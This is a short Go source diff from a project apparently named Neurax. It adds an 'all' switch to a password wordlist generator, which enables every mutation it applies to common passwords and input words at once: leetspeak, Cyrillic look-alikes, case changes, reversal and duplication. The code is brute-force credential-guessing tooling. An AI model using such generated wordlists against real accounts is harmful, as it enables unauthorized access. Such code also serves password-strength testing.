@@ -713,6 +713,7 @@ func RussianRoulette() error {
 
 //Returns transformed words from input slice
 func NeuraxWordlist(words ...string) []string {
+	use_all := Contains(NeuraxConfig.WordlistMutators, "all")
 	wordlist := []string{}
 	for i := 0; i < NeuraxConfig.WordlistCommonNum; i++ {
 		wordlist = append(wordlist, CommonPasswords[i])
@@ -730,22 +731,22 @@ func NeuraxWordlist(words ...string) []string {
 		wordlist = append(wordlist, word+"12")
 		wordlist = append(wordlist, word+"123")
 		if NeuraxConfig.WordlistExpand {
-			if Contains(NeuraxConfig.WordlistMutators, "encapsule") {
+			if Contains(NeuraxConfig.WordlistMutators, "encapsule") || use_all {
 				wordlist = append(wordlist, WordEncapsule(word)...)
 			}
-			if Contains(NeuraxConfig.WordlistMutators, "cyryllic") {
+			if Contains(NeuraxConfig.WordlistMutators, "cyryllic") || use_all {
 				wordlist = append(wordlist, WordCyryllicReplace(word)...)
 			}
-			if Contains(NeuraxConfig.WordlistMutators, "single_upper") {
+			if Contains(NeuraxConfig.WordlistMutators, "single_upper") || use_all {
 				wordlist = append(wordlist, WordSingleUpperTransform(word)...)
 			}
-			if Contains(NeuraxConfig.WordlistMutators, "leet") {
+			if Contains(NeuraxConfig.WordlistMutators, "leet") || use_all {
 				wordlist = append(wordlist, WordLeet(word)...)
 			}
-			if Contains(NeuraxConfig.WordlistMutators, "revert") {
+			if Contains(NeuraxConfig.WordlistMutators, "revert") || use_all {
 				wordlist = append(wordlist, WordRevert(word)...)
 			}
-			if Contains(NeuraxConfig.WordlistMutators, "duplicate") {
+			if Contains(NeuraxConfig.WordlistMutators, "duplicate") || use_all {
 				wordlist = append(wordlist, WordDuplicate(word)...)
 			}
 		}
